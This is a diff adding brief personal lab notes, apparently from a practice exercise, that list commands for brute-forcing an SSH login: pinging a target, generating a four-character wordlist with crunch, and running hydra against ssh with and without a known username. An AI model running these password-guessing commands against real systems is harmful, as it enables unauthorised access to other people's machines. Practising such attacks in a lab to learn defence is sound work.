@@ -1,0 +1,13 @@
+22/01/22
+1) Open command terminal in linux, run commands:
+
+> ping <Target IPADDRESS> [// eg:192.168.0.56]
+> ssh kali@192.168.1.1 [// username@IPADDRESS]
+------guess a wrong password-----[actaul password is: password]
+-----"Wrong password"-----
+> crunch 4 4 mypasswords > pass.txt [// Min length:4 Max length of password:4, a guess word: mypasswords]
+-----Dictionary created--------
+> hydra -L pass.txt -P pass.txt <IPADDRESS> ssh
+----Attack starts------
+> hydra -l vyos -P pass.txt <IPADDRESS> ssh [// use case if yuo know the username]
+--------Displays login and password details---------
